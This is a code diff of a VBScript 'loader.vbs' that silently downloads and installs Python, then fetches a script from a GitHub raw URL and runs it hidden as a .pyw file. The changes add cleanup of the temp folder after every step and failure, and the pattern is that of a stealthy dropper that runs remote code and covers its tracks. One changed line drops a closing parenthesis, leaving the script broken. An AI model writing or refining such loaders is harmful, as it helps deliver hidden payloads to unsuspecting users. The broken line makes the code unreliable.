@@ -10,7 +10,7 @@ SCRIPT_URL = "https://raw.githubusercontent.com/blockbastaz/ressources/refs/head
 ' Extract Python version from the URL (e.g., "3.11.7" → "311")
 Dim versionParts, majorMinor
 versionParts = Split(PYTHON_URL, "/")
-PYTHON_VERSION = versionParts(UBound(versionParts)) ' e.g., "python-3.11.7-amd64.exe"
+PYTHON_VERSION = versionParts(UBound(versionParts) ' e.g., "python-3.11.7-amd64.exe"
 majorMinor = Mid(PYTHON_VERSION, InStr(PYTHON_VERSION, "-") + 1, InStr(PYTHON_VERSION, "-amd64.exe") - InStr(PYTHON_VERSION, "-") - 1) ' e.g., "3.11.7"
 majorMinor = Replace(Left(majorMinor, InStr(majorMinor, ".") + 2), ".", "") ' e.g., "311"
 
@@ -18,16 +18,18 @@ majorMinor = Replace(Left(majorMinor, InStr(majorMinor, ".") + 2), ".", "") ' e.
 Set WShell = CreateObject("WScript.Shell")
 SCRIPT_DIR = WShell.CurrentDirectory ' Directory where loader.vbs is located
 INSTALL_DIR = WShell.ExpandEnvironmentStrings("%LocalAppData%") & "\Programs\Python\Python" & majorMinor ' e.g., %LocalAppData%\Programs\Python\Python311
-TEMP_DIR = WShell.ExpandEnvironmentStrings("%TEMP%") & "\tmp_" & Int((9999 * Rnd) + 1000)
+TEMP_DIR = WShell.ExpandEnvironmentStrings("%TEMP%") & "\tmp_" & Int((999999 * Rnd) + 100000) ' Use a larger random number to reduce collisions
 PYTHON_INSTALLER = TEMP_DIR & "\python-installer.exe"
-SCRIPT_NAME = TEMP_DIR & "\module.py"
+SCRIPT_NAME = TEMP_DIR & "\module.pyw"
 
 ' Create a shell object for running commands
 Dim FSO
 Set FSO = CreateObject("Scripting.FileSystemObject")
 
-' Create temp directory silently
-FSO.CreateFolder TEMP_DIR
+' Create temp directory silently, handle if it already exists
+If Not FSO.FolderExists(TEMP_DIR) Then
+    FSO.CreateFolder TEMP_DIR
+End If
 
 ' Function to run PowerShell commands silently
 Function RunPowerShellCommand(command)
@@ -39,6 +41,9 @@ RunPowerShellCommand "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest 
 
 ' Check if the installer was downloaded
 If Not FSO.FileExists(PYTHON_INSTALLER) Then
+    If FSO.FolderExists(TEMP_DIR) Then
+        FSO.DeleteFolder TEMP_DIR
+    End If
     WScript.Quit 1
 End If
 
@@ -59,6 +64,9 @@ If Not pythonFound Then
 
     ' Check if installation succeeded
     If Not FSO.FileExists(INSTALL_DIR & "\python.exe") Then
+        If FSO.FolderExists(TEMP_DIR) Then
+            FSO.DeleteFolder TEMP_DIR
+        End If
         WScript.Quit 1
     End If
 
@@ -70,6 +78,9 @@ End If
 On Error Resume Next
 WShell.Run "python --version", 0, True
 If Err.Number <> 0 Then
+    If FSO.FolderExists(TEMP_DIR) Then
+        FSO.DeleteFolder TEMP_DIR
+    End If
     WScript.Quit 1
 End If
 On Error GoTo 0
@@ -80,6 +91,9 @@ RunPowerShellCommand "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest 
 
 ' Check if the script was downloaded
 If Not FSO.FileExists(SCRIPT_NAME) Then
+    If FSO.FolderExists(TEMP_DIR) Then
+        FSO.DeleteFolder TEMP_DIR
+    End If
     WScript.Quit 1
 End If
 
@@ -99,7 +113,9 @@ End If
 If FSO.FileExists(SCRIPT_NAME) Then
     FSO.DeleteFile SCRIPT_NAME
 End If
-FSO.DeleteFolder TEMP_DIR
+If FSO.FolderExists(TEMP_DIR) Then
+    FSO.DeleteFolder TEMP_DIR
+End If
 
 ' Exit
 WScript.Quit 0
